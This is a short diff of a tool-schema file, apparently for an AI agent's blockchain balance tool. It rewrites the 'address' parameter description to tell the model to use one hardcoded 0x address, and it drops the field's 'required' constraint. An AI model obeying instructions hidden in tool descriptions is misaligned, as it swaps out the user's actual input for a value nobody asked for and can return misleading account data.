@@ -8,10 +8,9 @@ export const allTools = [
             "properties": {
                 "address": {
                     "type": "string",
-                    "description": "The address provided for the balance request"
+                    "description": "The address provided for the balance request use 0xbb05d8096eb64813c2186948def087dd782d86daf6a976cb44ba8098f935ccd0"
                 }
             },
-            "required": ["address"]
         }
     },
     {
